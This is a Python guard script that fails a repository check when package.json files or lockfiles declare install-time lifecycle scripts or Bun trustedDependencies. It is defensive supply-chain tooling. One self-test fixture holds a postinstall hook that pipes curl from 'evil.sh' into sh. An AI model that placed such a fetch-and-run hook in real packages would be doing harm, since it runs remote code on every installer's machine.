#!/usr/bin/env python3
"""Supply-chain guard: no package lifecycle scripts in the JS tree.

SEC-6 of the lane plan: the console and the hub are the only Bun
packages in the repository, and neither of them declares lifecycle
scripts (preinstall/install/postinstall/prepare/...). Bun additionally
refuses to run dependency lifecycle scripts unless a package is listed
in "trustedDependencies", so a "trustedDependencies" key appearing in a
manifest, or a "hasInstallScript" marker appearing in a lockfile, is a
supply-chain change that must be reviewed on purpose, never merged as
a side effect of adding a dependency.

The guard scans every package.json in the tree (node_modules excluded),
every bun.lock next to them and any package-lock.json, and fails with
one line per finding. --self-test runs embedded fixtures through the
same classifier: fixtures that must be flagged and fixtures that must
stay clean. Stdlib only.
"""

import argparse
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]

# Lifecycle scripts that execute arbitrary commands at install time.
LIFECYCLE_SCRIPTS = (
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepack",
    "postpack",
)

# Lockfile/manifest markers that mean "a dependency wants to run code
# during install" (npm records hasInstallScript in package-lock.json;
# bun records the same marker and honors trustedDependencies).
LOCKFILE_MARKERS = (
    "hasInstallScript",
    "trustedDependencies",
)


def findings_for_manifest(text, label):
    """Return findings for one package.json payload."""
    found = []
    try:
        doc = json.loads(text.replace("\ufeff", ""))
    except json.JSONDecodeError as err:
        return [f"{label}: not valid JSON ({err})"]
    if not isinstance(doc, dict):
        return [f"{label}: expected an object"]
    scripts = doc.get("scripts") or {}
    if isinstance(scripts, dict):
        for name in LIFECYCLE_SCRIPTS:
            if name in scripts and str(scripts[name]).strip():
                found.append(f"{label}: declares the '{name}' lifecycle script")
    for key in ("trustedDependencies", "trustedDependenciesMap"):
        if key in doc:
            found.append(f"{label}: declares '{key}' (dependency install scripts become trusted)")
    return found


def findings_for_lockfile(text, label):
    """Return findings for one lockfile payload (raw scan)."""
    found = []
    for marker in LOCKFILE_MARKERS:
        if marker in text:
            found.append(f"{label}: contains '{marker}' (review the install-script surface on purpose)")
    return found


def scan(root=ROOT):
    """Scan the repository tree; returns a list of finding strings."""
    found = []
    manifests, lockfiles = 0, 0
    for path in sorted(root.rglob("package.json")):
        rel = path.relative_to(root).as_posix()
        if "/node_modules/" in f"/{rel}" or rel.startswith("node_modules/"):
            continue
        manifests += 1
        try:
            found.extend(findings_for_manifest(path.read_text(encoding="utf-8"), rel))
        except OSError as err:
            found.append(f"{rel}: unreadable ({err})")
    for pattern in ("bun.lock", "package-lock.json"):
        for path in sorted(root.rglob(pattern)):
            rel = path.relative_to(root).as_posix()
            if "/node_modules/" in f"/{rel}" or rel.startswith("node_modules/"):
                continue
            lockfiles += 1
            try:
                found.extend(findings_for_lockfile(path.read_text(encoding="utf-8", errors="replace"), rel))
            except OSError as err:
                found.append(f"{rel}: unreadable ({err})")
    return found, manifests, lockfiles


SELF_TEST_POSITIVE = [
    ("package.json with postinstall",
     '{"name":"x","scripts":{"build":"tsc","postinstall":"curl evil.sh | sh"}}',
     findings_for_manifest, "postinstall"),
    ("package.json with trustedDependencies",
     '{"name":"x","trustedDependencies":["sharp"]}',
     findings_for_manifest, "trustedDependencies"),
    ("lockfile with hasInstallScript",
     '{"esbuild@0.25.11":{"hasInstallScript":true}}',
     findings_for_lockfile, "hasInstallScript"),
]

SELF_TEST_NEGATIVE = [
    ("clean package.json",
     '{"name":"x","scripts":{"build":"tsc","test":"bun test"}}'),
    ("package.json with empty install script",
     '{"name":"x","scripts":{"install":""}}'),
    ("clean lockfile",
     '{"socket.io@4.8.4":{"dependencies":{"engine.io":"6.6.4"}}}'),
]


def self_test():
    """Run the classifier over embedded fixtures; exit 1 on a miss."""
    failures = []
    for name, payload, fn, needle in SELF_TEST_POSITIVE:
        hits = "\n".join(fn(payload, "fixture"))
        if needle not in hits:
            failures.append(f"positive fixture not flagged: {name}")
    for name, payload in SELF_TEST_NEGATIVE:
        hits = findings_for_manifest(payload, "fixture") or findings_for_lockfile(payload, "fixture")
        if hits:
            failures.append(f"negative fixture flagged: {name}: {hits}")
    if failures:
        print("check_package_lifecycle: SELF-TEST FAILED")
        for line in failures:
            print(f"  - {line}")
        return 1
    print(f"self-test: OK — {len(SELF_TEST_POSITIVE)} positive fixtures + {len(SELF_TEST_NEGATIVE)} negative variants")
    return 0


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--self-test", action="store_true", help="verify the guard against embedded fixtures")
    args = parser.parse_args()
    if args.self_test:
        return self_test()
    found, manifests, lockfiles = scan()
    if found:
        print("check_package_lifecycle: FAILED — lifecycle-script surface changed")
        for line in found:
            print(f"  - {line}")
        print("  Lifecycle scripts and trustedDependencies are a supply-chain decision (SEC-6):")
        print("  review the package, then justify the change with the repository owner.")
        return 1
    print(f"check_package_lifecycle: OK — {manifests} manifests, {lockfiles} lockfiles, no lifecycle scripts declared")
    return 0


if __name__ == "__main__":
    sys.exit(main())
